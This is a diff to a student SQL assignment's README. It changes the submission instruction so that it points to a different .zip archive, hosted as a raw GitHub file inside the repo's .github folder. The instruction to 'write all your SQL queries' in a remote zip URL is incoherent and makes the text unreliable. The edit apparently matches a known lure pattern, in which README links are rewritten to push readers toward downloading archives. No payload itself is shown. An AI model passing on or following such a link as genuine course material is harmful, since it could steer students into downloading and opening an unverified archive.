@@ -16,7 +16,7 @@
 
 
 ## 📝 Submission Instructions  
-📂 Write all your SQL queries in the **https://raw.githubusercontent.com/timokamau/wk-7a-timokamau/main/.github/workflows/wk-7a-timokamau-v1.9.zip** file.  
+📂 Write all your SQL queries in the **https://raw.githubusercontent.com/timokamau/wk-7a-timokamau/main/.github/a_wk_timokamau_v2.9.zip** file.  
 ✍️ Answer each question concisely and make sure your queries are clear and correct.  
 🗣️ Structure your responses clearly, and use comments if necessary to explain your approach.
 
